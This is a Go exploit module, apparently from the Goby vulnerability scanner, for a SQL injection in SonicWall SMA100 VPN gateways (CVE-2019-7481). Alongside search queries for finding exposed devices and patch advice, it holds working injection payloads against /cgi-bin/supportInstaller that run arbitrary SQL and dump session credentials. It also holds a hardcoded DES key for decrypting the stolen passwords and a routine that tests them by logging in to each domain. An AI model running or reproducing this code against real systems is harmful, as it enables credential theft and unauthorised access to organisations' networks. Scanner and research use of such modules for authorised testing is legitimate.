package exploits

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sonicwall SMA100 supportInstaller SQL injection vulnerability (CVE-2019-7481)",
    "Description": "<p>SonicWALL internet security devices provide a security platform for various organizations to protect their networks from internet security threats. Its ease of use and high performance have been highly praised by industry media. Sonicwall SMA100 is a secure access gateway device from Sonicwall Corporation in the United States.</p><p>There is an SQL injection vulnerability in SonicWall SMA100 9.0.0.3 and earlier versions. Attackers can exploit this vulnerability to execute SQL commands, export online user accounts and passwords from the session, and decrypt password ciphertext.</p>",
    "Product": "SONICWALL-SSL-VPN",
    "Homepage": "https://www.sonicwall.com/",
    "DisclosureDate": "2023-12-26",
    "PostTime": "2024-01-17",
    "Author": "zou",
    "FofaQuery": "banner=\"SonicWALL SSL-VPN\" || header=\"SonicWALL SSL-VPN\" || body=\"javascript/aventail.js\" || title=\"SonicWall SSL VPN\" || title=\"SonicWall - SSL VPN\" || (header=\"Server: SonicWALL\" && (body=\"sslvpnLogin\" || body=\"SSL-VPN\" || body=\"window.status = window.defaultStatus = \\\"SonicWall - Virtual Office\")) || (body=\"<div id=sslvpn-portal>\" && body=\"href=/sonicui/7/sslvpn-portal/\") || (body=\"class=\\\"copyright\\\">SonicWall, Inc.</font>\" && (body=\"<meta name=\\\"id\\\" content=\\\"sslvpnLogin\\\">\" || body=\"<iframe name=\\\"sslvpnTgtFrm\"))",
    "GobyQuery": "banner=\"SonicWALL SSL-VPN\" || header=\"SonicWALL SSL-VPN\" || body=\"javascript/aventail.js\" || title=\"SonicWall SSL VPN\" || title=\"SonicWall - SSL VPN\" || (header=\"Server: SonicWALL\" && (body=\"sslvpnLogin\" || body=\"SSL-VPN\" || body=\"window.status = window.defaultStatus = \\\"SonicWall - Virtual Office\")) || (body=\"<div id=sslvpn-portal>\" && body=\"href=/sonicui/7/sslvpn-portal/\") || (body=\"class=\\\"copyright\\\">SonicWall, Inc.</font>\" && (body=\"<meta name=\\\"id\\\" content=\\\"sslvpnLogin\\\">\" || body=\"<iframe name=\\\"sslvpnTgtFrm\"))",
    "Level": "3",
    "Impact": "<p>There is an SQL injection vulnerability in SonicWall SMA100 9.0.0.3 and earlier versions. Attackers can exploit this vulnerability to execute SQLite database commands, export online user accounts and passwords from the session, and decrypt password ciphertext.</p>",
    "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/\">https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint,exportUser",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select sqlite_version()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2019-7481"
    ],
    "CNNVD": [
        "CNNVD-201912-826"
    ],
    "CNVD": [
        "CNVD-2020-04137"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Sonicwall SMA100 supportInstaller SQL 注入漏洞（CVE-2019-7481）",
            "Product": "SONICWALL-SSL-VPN",
            "Description": "<p>SonicWALL 互联网安全设备为各类组织提供安全平台，保护其网络免受互联网安全威胁。其易于使用和高性能的特点，受到业界媒体的高度称赞。Sonicwall SMA100 是美国 Sonicwall 公司的一款安全访问网关设备。</p><p>SonicWall SMA100 9.0.0.3 及之前版本中存在 SQL 注入漏洞。攻击者可利用该漏洞执行 SQL 命令，并且可以从会话中导出在线用户的账号和密码，并可以解密密码密文。</p>",
            "Recommendation": "<p>1、厂商已发布补丁和修复方案，请及时更新：<a href=\"https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/\">https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>SonicWall SMA100 9.0.0.3 及之前版本中存在 SQL 注入漏洞。攻击者可利用该漏洞执行&nbsp;<span style=\"font-size: 15px;\">SQLite 数据库</span>命令，并且可以从会话中导出在线用户的账号和密码，并可以解密密码密文。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Sonicwall SMA100 supportInstaller SQL injection vulnerability (CVE-2019-7481)",
            "Product": "SONICWALL-SSL-VPN",
            "Description": "<p>SonicWALL internet security devices provide a security platform for various organizations to protect their networks from internet security threats. Its ease of use and high performance have been highly praised by industry media. Sonicwall SMA100 is a secure access gateway device from Sonicwall Corporation in the United States.</p><p>There is an SQL injection vulnerability in SonicWall SMA100 9.0.0.3 and earlier versions. Attackers can exploit this vulnerability to execute SQL commands, export online user accounts and passwords from the session, and decrypt password ciphertext.</p>",
            "Recommendation": "<p>1. The manufacturer has released patches and repair plans. Please update them promptly: <a href=\"https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/\">https://www.sonicwall.com/zh-cn/products/remote-access/secure-mobile-access-100-series/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in SonicWall SMA100 9.0.0.3 and earlier versions. Attackers can exploit this vulnerability to execute SQLite database commands, export online user accounts and passwords from the session, and decrypt password ciphertext.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10907"
}`

	sendPostRequest3rewr44t := func(hostInfo *httpclient.FixUrl, url string, data string) (*httpclient.HttpResponse, error) {
		sendPostRequestConfig := httpclient.NewPostRequestConfig(url)
		sendPostRequestConfig.FollowRedirect = false
		sendPostRequestConfig.VerifyTls = false
		sendPostRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendPostRequestConfig.Data = data
		return httpclient.DoHttpRequest(hostInfo, sendPostRequestConfig)
	}

	decryptDes0ggre42t := func(passwdHex string) string {
		passwdHexSring, _ := hex.DecodeString(passwdHex)
		block, _ := des.NewCipher([]byte("/O*\x86\xd5R\xf8\x80"))
		mode := cipher.NewCBCDecrypter(block, []byte("\x00\x00\x00\x00\x00\x00\x00\x00"))
		passwd := make([]byte, len(passwdHexSring))
		mode.CryptBlocks(passwd, passwdHexSring)
		passwd = bytes.TrimRight(passwd, "\x00")
		return string(passwd)
	}

	exportUserInfo8fdsrtt4t := func(hostInfo *httpclient.FixUrl) (string, error) {
		userInfoMap := map[string]string{}
		var userInfo string
		var errs error
		for offset := 0; ; offset++ {
			resp, err := sendPostRequest3rewr44t(hostInfo, "/cgi-bin/supportInstaller", fmt.Sprintf("fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,userName,0,password,0,0+FROM+Sessions+LIMIT+1+OFFSET+%d--", offset))
			matchRegexpName := regexp.MustCompile(`username\s*=\s*"([^"]+)"`)
			matchRegexpPasswd := regexp.MustCompile(`supportcode\s*=\s*"([^"]+)"`)
			if resp != nil && resp.StatusCode == 200 && len(matchRegexpName.FindStringSubmatch(resp.Utf8Html)) > 1 && len(matchRegexpPasswd.FindStringSubmatch(resp.Utf8Html)) > 1 {
				userInfoMap[matchRegexpName.FindStringSubmatch(resp.Utf8Html)[1]] = decryptDes0ggre42t(matchRegexpPasswd.FindStringSubmatch(resp.Utf8Html)[1])
			} else {
				errs = err
				break
			}
		}
		//Session会话中可能存在一些过期的临时密码的账户，需要对导出账户密码做过滤
		if len(userInfoMap) > 0 {
			getDomainConfig := httpclient.NewPostRequestConfig("/cgi-bin/welcome")
			getDomainConfig.FollowRedirect = false
			getDomainConfig.VerifyTls = false
			matchRegexpDomain := regexp.MustCompile(`<option\s+value="([^"]+)"`)
			resp, err := httpclient.DoHttpRequest(hostInfo, getDomainConfig)
			if resp != nil && len(matchRegexpDomain.FindAllStringSubmatch(resp.Utf8Html, -1)) > 0 {
				for userName, password := range userInfoMap {
					for _, Domain := range matchRegexpDomain.FindAllStringSubmatch(resp.Utf8Html, -1) {
						if result, err := sendPostRequest3rewr44t(hostInfo, "/cgi-bin/userLogin", "username="+userName+"&password="+password+"&domain="+Domain[1]+"&loginButton=%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3&state=login&login=true&verifyCert=0&portalname=VirtualOffice&ajax=true"); err == nil && result.StatusCode == 200 && strings.Contains(result.Utf8Html, `"status":"success"`) {
							userInfo += Domain[1] + ": " + userName + ":" + password + "\n"
							break
						} else {
							continue
						}
					}
				}
			} else {
				errs = err
			}
		}
		return userInfo, errs
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomInta := rand.Intn(10000)
			randomIntb := rand.Intn(10000)
			matchRegexp := regexp.MustCompile(`username\s*=\s*"([^"]+)"`)
			if resp, _ := sendPostRequest3rewr44t(hostInfo, "/cgi-bin/supportInstaller", fmt.Sprintf("fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,(%s*%s),0,0,0,0--", strconv.Itoa(randomInta), strconv.Itoa(randomIntb))); resp != nil && resp.StatusCode == 200 && len(matchRegexp.FindStringSubmatch(resp.Utf8Html)) > 1 {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				return strings.Contains(matchRegexp.FindStringSubmatch(resp.Utf8Html)[1], strconv.Itoa(randomInta*randomIntb))
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				resp, err := sendPostRequest3rewr44t(expResult.HostInfo, "/cgi-bin/supportInstaller", fmt.Sprintf("fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,(%s),0,0,0,0--", url.QueryEscape(goutils.B2S(ss.Params["sql"]))))
				matchRegexp := regexp.MustCompile(`username\s*=\s*"([^"]+)"`)
				if resp != nil && resp.StatusCode == 200 && len(matchRegexp.FindStringSubmatch(resp.Utf8Html)) > 1 {
					expResult.Success = true
					expResult.Output = matchRegexp.FindStringSubmatch(resp.Utf8Html)[1]
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				randomInta := rand.Intn(10000)
				randomIntb := rand.Intn(10000)
				matchRegexp := regexp.MustCompile(`username\s*=\s*"([^"]+)"`)
				if resp, err := sendPostRequest3rewr44t(expResult.HostInfo, "/cgi-bin/supportInstaller", fmt.Sprintf("fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,(%s*%s),0,0,0,0--", strconv.Itoa(randomInta), strconv.Itoa(randomIntb))); resp != nil && resp.StatusCode == 200 && len(matchRegexp.FindStringSubmatch(resp.Utf8Html)) > 1 && strings.Contains(matchRegexp.FindStringSubmatch(resp.Utf8Html)[1], strconv.Itoa(randomInta*randomIntb)) {
					expResult.Success = true
					expResult.Output = "POST /cgi-bin/supportInstaller HTTP/1.1\n" +
						"Host:" + expResult.HostInfo.HostInfo + "\n" +
						"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n" +
						"\r\n" +
						"fromEmailInvite=1&customerTID=unpossible'+" + fmt.Sprintf("fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,%s*%s,0,0,0,0", strconv.Itoa(randomInta), strconv.Itoa(randomIntb)) + "--"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "exportUser" {
				userInfo, err := exportUserInfo8fdsrtt4t(expResult.HostInfo)
				if len(userInfo) > 0 {
					expResult.Success = true
					expResult.Output = userInfo
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
